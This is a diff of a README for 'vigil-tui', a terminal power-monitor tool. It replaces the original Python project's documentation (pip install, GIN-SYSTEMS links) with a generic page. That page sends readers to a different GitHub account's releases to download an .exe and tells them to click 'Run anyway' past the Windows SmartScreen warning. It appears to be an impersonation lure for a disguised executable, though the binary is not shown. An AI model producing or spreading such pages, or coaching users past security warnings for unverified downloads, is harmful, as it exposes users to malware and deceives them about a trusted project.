@@ -1,228 +1,93 @@
-<div align="center">
+# ⚡ vigil-tui - Track your computer power usage easily
 
-# VIGIL
+[![](https://img.shields.io/badge/Download-vigil--tui-blue)](https://github.com/daisievolumetrical8820/vigil-tui/releases)
 
-**Real-time terminal power monitor — CPU · GPU · RAM · Network · Processes**
+vigil-tui provides a live view of how much power your computer components use. It shows wattage for your CPU, graphics card, and memory. This tool helps you see which tasks drain your battery or pull the most electricity from your wall outlet.
 
-[![CI](https://github.com/GIN-SYSTEMS/vigil-tui/actions/workflows/ci.yml/badge.svg)](https://github.com/GIN-SYSTEMS/vigil-tui/actions)
-[![Python](https://img.shields.io/badge/python-3.11%2B-blue?logo=python&logoColor=white)](https://www.python.org/)
-[![Platform](https://img.shields.io/badge/platform-Linux%20%7C%20Windows-lightgrey)](https://github.com/GIN-SYSTEMS/vigil-tui)
-[![License](https://img.shields.io/badge/license-MIT-green)](LICENSE)
+## 📋 What this tool does
 
-</div>
+Modern computers perform complex tasks that change power needs every second. Most users do not see this data. vigil-tui changes that by showing clear numbers on your screen. 
 
----
+Key features include:
+* Real-time monitoring of CPU power draw.
+* Live updates for your graphics card wattage.
+* Instant tracking of RAM power consumption.
+* Low impact on your system resources while running.
+* A simple dashboard that works inside a terminal window.
 
-![vigil-tui dashboard](assets/screenshot.png)
+## 💻 System requirements
 
----
+Your computer must meet these basic needs to run vigil-tui:
+* A modern Windows 10 or 11 system.
+* A CPU that supports power reporting via software.
+* A dedicated graphics card with current drivers installed.
+* At least 4GB of system memory.
 
-## Overview
+## 📥 How to download and install
 
-vigil is a high-resolution terminal dashboard that shows **live wattage, thermals, clock speeds, efficiency scores, and electricity cost** for every major component — all inside the terminal with no browser, no background service, no telemetry.
+Follow these steps to get the software on your machine.
 
-It reads directly from hardware sensors (hwmon, RAPL, LibreHardwareMonitor, NVML) and falls back gracefully when a sensor is unavailable. Every panel updates in real time, the whole thing runs from a single `vigil` command.
+1. Visit the [official release page](https://github.com/daisievolumetrical8820/vigil-tui/releases) to find the latest version.
+2. Look for the file ending in `.exe` under the Assets section.
+3. Click the filename to start the download.
+4. Save the file to your desktop or your Downloads folder.
+5. This software does not need a formal installation process. Double-click the file to open the dashboard immediately.
 
----
+## ⚙️ Running the software
 
-## Features
+Because this tool talks to your hardware components directly, Windows may show a security prompt the first time you run it.
 
-### Power & Thermals
-- **CPU package power** — hwmon (k10temp / zenpower / amd_energy) → RAPL → LibreHardwareMonitor WMI → CPU% × TDP estimate
-- **GPU power** — NVIDIA NVML: watts, temperature, utilisation, core/mem clocks, VRAM, fan speed
-- **RAM wattage** — DDR4 power model (slot count × utilisation)
-- **Throttle detection** — blinking `THROTTLE` badge on CPU or GPU thermal throttle
+1. Double-click the vigil-tui icon.
+2. If a window labeled "Windows protected your PC" appears, click "More info."
+3. Click the button that says "Run anyway."
+4. A terminal window will open and begin displaying your power data.
 
-### Charts & Visualisation
-- **Power history** — high-resolution Braille area chart, CPU + GPU overlay
-- **Clock history** — CPU avg frequency + GPU core clock with boost ceiling marker
-- **Per-core bars** — utilisation % + live frequency for every core
+## 📊 Reading the dashboard
 
-### Process Intelligence
-- **Process table** — ranked by estimated wattage contribution
-- **Sparkline trends** — per-process watt history mini-chart
-- **EST.W column** — watts per process derived from CPU% share of package power
+The dashboard organizes your power usage data into three main rows.
 
-### Efficiency & Cost
-- **Efficiency score** — `OPTIMAL` · `NORMAL` · `LOW EFF` · `THROTTLE`
-- **Electricity cost** — /hr, /day, session total (configurable kWh price + currency)
-- **Baseline mode** — snapshot idle state, compare live delta in real time
+### Row 1: CPU
+This shows the power used by your main processor. High numbers here mean your computer works hard on calculation tasks. 
 
-### Alerts & Logging
-- **Webhook alerts** — HTTP POST when CPU temp or power threshold is breached
-- **Session logging** — optional JSONL tick log (`--log` flag)
-- **SVG screenshot** — full dashboard export with `s`
+### Row 2: GPU
+This shows the power used by your graphics card. This number jumps when you play games or edit high-quality video files.
 
-### Themes & UX
-- **TacticalCyberpunk** (dark) — green / amber / cyan on near-black
-- **GhostWhite** (light) — high-contrast monochrome
-- **Setup wizard** — first-run guided TDP + kWh configuration
-- **Live accent recolour** — sidebar colour tweaks without restart
+### Row 3: RAM
+This shows the power used by your memory sticks. This number stays relatively stable but increases when you open many programs at once.
 
----
+## 🛠️ Troubleshooting common issues
 
-## Platform Support
+Most users get the program running within seconds. If you see blank data, check these items:
 
-| Platform | CPU Power | CPU Temp | GPU Power | GPU Temp |
-|---|---|---|---|---|
-| **Linux** | hwmon · RAPL · estimate | hwmon | NVML | NVML |
-| **Windows 11 / 10** | LibreHardwareMonitor · estimate | LHM | NVML | NVML |
-| **macOS** | estimate only | — | NVML (if present) | NVML |
+* Update your graphics card drivers. Old drivers often fail to report power data.
+* Restart your computer. Sometimes hardware sensors lock up after long periods of uptime.
+* Check if another program already uses your hardware sensors. Close other diagnostic tools before you open vigil-tui.
+* Ensure you are connected to power. Laptops often limit sensor data reporting when running on battery save mode.
 
-### Windows — accurate CPU readings
+## 🔍 Frequently Asked Questions
 
-vigil reads real CPU wattage through **[LibreHardwareMonitor](https://github.com/LibreHardwareMonitor/LibreHardwareMonitor) (MPL-2.0)** via its WMI interface. Without it, vigil falls back to a CPU% × TDP estimate automatically.
+**Does this program slow down my computer?**
+No. vigil-tui uses a very small amount of memory and processor time. You will not notice a change in performance while it runs.
 
-1. Download [LibreHardwareMonitor](https://github.com/LibreHardwareMonitor/LibreHardwareMonitor/releases)
-2. Run it **as Administrator**
-3. Launch vigil — LHM is detected automatically
+**Can I save the data to a file?**
+The current version shows the data live on your screen. Future updates may add a save feature to export your logs to a text file.
 
-> vigil does not bundle or modify LibreHardwareMonitor. It connects to its WMI interface at runtime. LHM must be running separately.
+**Is my hardware supported?**
+Most hardware made in the last five years works well. If you see zeros across all rows, your specific model might not expose power data through standard channels.
 
----
+**Do I need an internet connection?**
+No. vigil-tui reads sensors inside your computer. It does not send data to the web. Your information stays on your machine at all times.
 
-## Installation
+**How do I close the program?**
+Click the small X in the corner of the window or press the escape key on your keyboard. This stops the program and clears the terminal screen.
 
-**Requirements:** Python 3.11+
+## 🌟 Future improvements
 
-```bash
-# Clone
-git clone https://github.com/GIN-SYSTEMS/vigil-tui
-cd vigil-tui
+We plan to add more features based on user feedback. Planned updates include:
 
-# Linux / macOS
-pip install .
+* Customizable alert sounds when power usage hits a high limit.
+* Color-coded charts that change from green to red as usage gets higher.
+* A simplified view for users who only want to monitor one component at a time.
+* Ability to minimize the app to the system tray so it stays out of your way.
 
-# Windows (includes WMI + pywin32 for LHM support)
-pip install ".[windows]"
-```
-
-**Run:**
-```bash
-vigil           # launch dashboard
-vigil --log     # launch + write JSONL tick log
-vigil --help    # all options
-```
-
----
-
-## Key Bindings
-
-| Key | Action |
-|-----|--------|
-| `*` / `?` | Toggle help overlay |
-| `q` / Ctrl+C | Quit |
-| `p` | Pause / resume sampling |
-| `r` | Reset chart history |
-| `+` / `-` | Zoom Y-axis in / out |
-| `b` | Snapshot baseline — press again to clear |
-| `s` | Save SVG screenshot |
-| `t` | Toggle theme (dark ↔ light) |
-| `c` | Open config / setup wizard |
-
----
-
-## Configuration
-
-First launch creates `~/.config/vigil/config.toml`:
-
-```toml
-[hardware]
-cpu_tdp_watts       = 65.0     # CPU TDP ceiling for estimation
-gpu_tdp_watts       = 165.0    # GPU TDP ceiling
-update_interval     = 1.0      # seconds between ticks
-history_len         = 120      # chart ring-buffer depth
-
-[cost]
-kwh_price           = 2.0      # electricity price per kWh
-currency_symbol     = "₺"
-
-[alerts]
-webhook_url         = ""       # HTTP POST endpoint — empty = disabled
-cpu_temp_thresh     = 90       # °C
-cpu_watt_thresh_pct = 90       # % of TDP
-
-[ui]
-theme               = "tactical"   # "tactical" or "ghost"
-```
-
----
-
-## How the power waterfall works
-
-```
-vigil starts
-│
-├─ Linux?
-│   ├─ hwmon sysfs (k10temp / zenpower / amd_energy)   ← real sensor
-│   ├─ RAPL powercap energy_uj delta                   ← kernel counter
-│   └─ CPU% × TDP estimate                             ← always available
-│
-└─ Windows?
-    ├─ LibreHardwareMonitor WMI (requires Admin + LHM) ← real sensor
-    └─ CPU% × TDP estimate                             ← always available
-
-GPU → NVML (pynvml) on all platforms
-     if no NVIDIA GPU: panel shows "unavailable", no crash
-```
-
----
-
-## Project Structure
-
-```
-vigil-tui/
-├── src/vigil/
-│   ├── app.py                   # Textual app, layout, tick loop
-│   ├── config.py                # Static constants
-│   ├── config_manager.py        # TOML config loader/writer
-│   ├── session.py               # Cost tracking, webhooks, JSONL logging
-│   ├── collectors/
-│   │   ├── base.py              # Collector ABC + SensorReading
-│   │   ├── cpu.py               # hwmon → RAPL → LHM → estimate
-│   │   ├── gpu.py               # NVIDIA NVML
-│   │   ├── ram.py               # RAM wattage model
-│   │   ├── netdisk.py           # Network + disk I/O rates
-│   │   └── system.py            # Orchestrator → SystemSnapshot
-│   └── widgets/
-│       ├── power_header.py      # Top bar: wordmark + gauge
-│       ├── cpu_panel.py         # Left: CPU + per-core bars
-│       ├── braille_chart.py     # Center: power history
-│       ├── clock_chart.py       # Center: clock history
-│       ├── process_table.py     # Center: process ranking
-│       ├── gpu_panel.py         # Right: GPU metrics
-│       ├── financial_widget.py  # Cost display
-│       ├── netdisk_widget.py    # Network + disk rates
-│       ├── status_bar.py        # Footer
-│       ├── boot_screen.py       # Splash screen
-│       ├── help_overlay.py      # Key bindings overlay
-│       └── setup_wizard.py      # First-run wizard
-├── .github/workflows/ci.yml
-├── pyproject.toml
-├── requirements.txt
-└── LICENSE
-```
-
----
-
-## Dependencies
-
-| Package | Purpose |
-|---------|---------|
-| `textual >= 0.80` | TUI framework |
-| `psutil >= 5.9.8` | CPU%, process list, net/disk I/O |
-| `pynvml >= 11.5.0` | NVIDIA GPU metrics |
-| `wmi >= 1.5.1` *(Windows)* | LHM WMI bridge |
-| `pywin32 >= 306` *(Windows)* | Windows COM/WMI support |
-
----
-
-## License
-
-[MIT](LICENSE) — free to use, modify, and distribute.
-
----
-
-<div align="center">
-built by <a href="https://github.com/GIN-SYSTEMS">GIN-SYSTEMS</a>
-</div>
+We encourage you to check the release page often for these changes. We build this tool to be stable and clear for everyone. Please maintain your focus on the numbers displayed on your screen to understand your computer hardware habits better. This brings transparency to your daily computing tasks without unnecessary complexity.
